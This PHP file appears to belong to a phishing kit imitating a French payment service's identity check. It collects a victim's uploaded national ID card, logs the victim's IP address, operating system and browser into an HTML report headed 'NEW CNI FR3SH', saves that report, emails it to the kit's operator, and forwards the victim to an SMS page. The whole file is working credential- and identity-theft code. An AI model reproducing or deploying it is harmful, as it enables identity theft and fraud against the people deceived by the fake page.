<?php

    session_start();
    include("../system.php");

    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
    // Check if image file is a actual image or fake image
    if(isset($_POST["submit"])) {
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            header("Location: ../../app/identification.php?country.x=FR&flowContext=inconnufile");
            $uploadOk = 0;
        }
    }
    // Check file size
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        header("Location: ../../app/identification.php?country.x=FR&flowContext=largesizefile");
        $uploadOk = 0;
    }
    // Allow certain file formats
    if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
    && $imageFileType != "gif" ) {
    	header("Location: ../../app/identification.php?country.x=FR&flowContext=unexistfile");
        $uploadOk = 0;
    }
    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        header("Location: ../../app/identification.php?country.x=FR&flowContext=checkfile");
    // if everything is ok, try to upload file
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $picurl = $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . "/" . $target_file;

        $valhallaletter = '
            <!DOCTYPE html>
            <html>
            <head><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}</style>
            </head>
            <body>
                <div style="height:100%;min-height: 100vh;width:100%;background-color: #0a0a0a;background-image: radial-gradient(circle farthest-side at center bottom,#0a0a0a,#c71812 125%);padding: 25px 0">
                    <div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">

                        <div><img src="https://i.imgur.com/4LQAiAh.jpg" style="height: 50px;margin:0 auto;display: block;"></div>

                        <h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">NEW CNI FR3SH 👨‍🚀</h1>
                        <div>
                            <div style="margin-bottom: 20px;">
                                <span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">📂PREUVE IDENTITER :</span>
                                <div>
                                    <a href="'.$picurl.'"><img style="width: 100%;display:block" src="'.$picurl.'"></a>
                                </div>
                            </div>
                        </div>
                        <h1 style="color: #fff;text-align: center;padding: 0 0 20px 0;font-family: arial;">👁‍🗨User Agent</h1>
                        <div>
                            <div style="margin-bottom: 20px;">
                                <span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🌑Date & Temps :</span>
                                <h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
                                    '. $date .'
                                </h2>
                            </div>
                            <div style="margin-bottom: 20px;">
                                <span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">💻Addresse IP :</span>
                                <h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;">
                                    <a style="color: #c71812" target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a>
                                </h2>
                            </div>
                            <div style="margin-bottom: 20px;">
                                <span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">👉System :  </span>
                                <h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
                                    '. $user_os .'
                                </h2>
                            </div>
                            <div style="margin-bottom: 20px;">
                                <span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">🤖Navigateur : </span>
                                <h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #c71812">
                                    '. $user_browser .'
                                </h2>
                            </div>
                        </div>

                    </div>
                </div>
            </body>
            </html>';


        $file = fopen("../../../admin/".$ip.".html", "a");
        fwrite($file, $valhallaletter);

        include("../../../e-mail.php");

        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = "valhalla DOC 🦅";
        $headers .= "From: Evil Rick RZLT 😈 <valhalla@websec.com>" . "\r\n";
        mail($valhallato, $subject, $valhallaletter, $headers);

        header("Location: ../../app/sms.php");

        } else {
            header("Location: ../../app/identification.php?country.x=FR&flowContext=error");
        }
    }
